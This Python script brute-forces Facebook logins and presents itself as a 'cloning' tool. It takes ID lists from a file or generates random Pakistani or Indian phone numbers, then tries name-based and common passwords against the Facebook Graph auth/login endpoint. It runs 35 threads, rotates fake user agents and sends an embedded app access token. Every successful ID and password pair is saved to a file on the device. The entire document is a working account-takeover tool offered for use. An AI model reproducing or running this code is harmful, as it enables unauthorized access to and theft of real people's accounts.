# Script Author: CHARSI-HUB
# Power by: ERROR X ETHAN
import os, requests, json, time, re, random, sys, uuid, platform, httplib2, arrow
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime
from bs4 import BeautifulSoup as sop

# --- Global Variables ---
loop = 0
oks = []
cps = []
plist = []

# --- Charsi Theme Banner ---
def clear():
    os.system('clear')
    print("""\033[1;32m
  ____ _   _    _    ____  ____ ___ 
 / ___| | | |  / \  |  _ \/ ___|_ _|
| |   | |_| | / _ \ | |_) \___ \ | | 
| |___|  _  |/ ___ \|  _ < ___) || | 
 \____|_| |_/_/   \_\_| \_\____/___|
\033[1;91m--------------------------------------------------
\033[1;97m [•] AUTHOR   : \033[1;92mCHARSI LOGON KA ADDA
\033[1;97m [•] THEME    : \033[1;92mFULL CHARSI BRUTE FORCE
\033[1;97m [•] STATUS   : \033[1;92mFULL WORKING (FILE+RANDOM)
\033[1;91m--------------------------------------------------""")

def linex():
    print('\033[1;91m--------------------------------------------------')

# --- User-Agent Generator (Charsi Special) ---
def generate_ua():
    # Strongest UA for Brute Force
    android_version = random.choice(['10', '11', '12', '13', '14'])
    fb_version = f"{random.randint(400, 450)}.0.0.{random.randint(10, 99)}.{random.randint(100, 200)}"
    fb_build = str(random.randint(100000000, 999999999))
    device = random.choice(['SM-G998B', 'SM-A525F', 'M2012K11AG', 'RMX3311', 'V2109', 'X688B', 'TECNO-KJ5'])
    ua = f'Mozilla/5.0 (Linux; Android {android_version}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110, 126)}.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fb_version};FBBV/{fb_build};]'
    return ua

# --- Main Menu ---
def Menu():
    clear()
    print(' [1] CHARSI FILE CLONING (BRUTE FORCE)')
    print(' [2] CHARSI RANDOM CLONING (NUMBER)')
    print(' [3] CONTACT CHARSI AUTHOR')
    print(' [0] EXIT')
    linex()
    opt = input(' \033[1;32mCHOOSE OPTION : \033[1;97m')
    if opt == '1':
        Charsi_File()
    elif opt == '2':
        Charsi_Random()
    else:
        exit()

# --- File Brute Force ---
def Charsi_File():
    clear()
    print(' EXAMPLE : /sdcard/file.txt')
    linex()
    file = input(' ENTER FILE PATH : ')
    try:
        fo = open(file, 'r').read().splitlines()
    except:
        print(' FILE NAHI MILI CHARSI BHAI!'); time.sleep(2); Menu()
    
    clear()
    print(' [1] CHARSI AUTO PASS (HEAVY BRUTE)')
    linex()
    input(' START KARO? (ENTER DABAIN) : ')
    
    clear()
    print(f' TOTAL CHARSI IDS : {len(fo)}')
    print(' BRUTE FORCE START... NASHA ON HAI!')
    linex()
    
    with tred(max_workers=35) as hub:
        for user in fo:
            try:
                ids, names = user.split('|')
                fn = names.split(' ')[0].lower()
                ln = names.split(' ')[1].lower() if ' ' in names else fn
                # Heavy Brute Force Passwords
                pasx = [fn+'123', fn+'1234', fn+'12345', names.lower(), fn+ln, fn+'786', 'khankhan', 'pakistan']
                hub.submit(Brute_Logic, ids, pasx)
            except: pass
    Finish()

# --- Random Brute Force ---
def Charsi_Random():
    clear()
    print(' EXAMPLE : 0300, 0306, 0335, 0345')
    code = input(' ENTER CODE : ')
    limit = int(input(' KITNI IDS (LIMIT) : '))
    
    clear()
    print(' [1] PAKISTAN RANDOM PASS')
    print(' [2] INDIA RANDOM PASS')
    linex()
    m_opt = input(' SELECT : ')
    
    clear()
    print(f' BRUTE START ON CODE : {code}')
    linex()
    
    with tred(max_workers=35) as hub:
        for _ in range(limit):
            ids = code + str(random.randint(1111111, 9999999))
            if m_opt == '1':
                pasx = [ids, ids[:7], 'khan123', 'pakistan', 'khan786']
            else:
                pasx = [ids, ids[:6], 'kumar123', 'india123']
            hub.submit(Brute_Logic, ids, pasx)
    Finish()

# --- Core Brute Force Logic ---
def Brute_Logic(ids, pasx):
    global loop, oks, cps
    sys.stdout.write(f'\r\r\033[1;97m [CHARSI] %s | OK:%s | CP:%s '%(loop, len(oks), len(cps))); sys.stdout.flush()
    try:
        for pas in pasx:
            ua = generate_ua()
            data = {
                "adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "email": ids,
                "password": pas,
                "generate_session_cookies": "1",
                "method": "auth.login",
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            }
            headers = {
                'User-Agent': ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            }
            
            res = requests.post('https://graph.facebook.com/auth/login', data=data, headers=headers).json()
            
            if 'session_key' in res:
                print(f'\r\033[1;32m [CHARSI-OK] {ids} | {pas} \033[1;97m')
                os.system('espeak -a 300 "Charsi Bhai Ok ID"')
                oks.append(ids)
                open('/sdcard/CHARSI-OK.txt', 'a').write(ids+'|'+pas+'\n')
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                # print(f'\r\033[1;33m [CHARSI-CP] {ids} | {pas} \033[1;97m')
                cps.append(ids)
                break
        loop += 1
    except:
        pass

def Finish():
    linex()
    print(f' BRUTE FINISHED | TOTAL OK: {len(oks)}')
    input(' PRESS ENTER TO GO BACK')
    Menu()

if __name__ == "__main__":
    Menu()
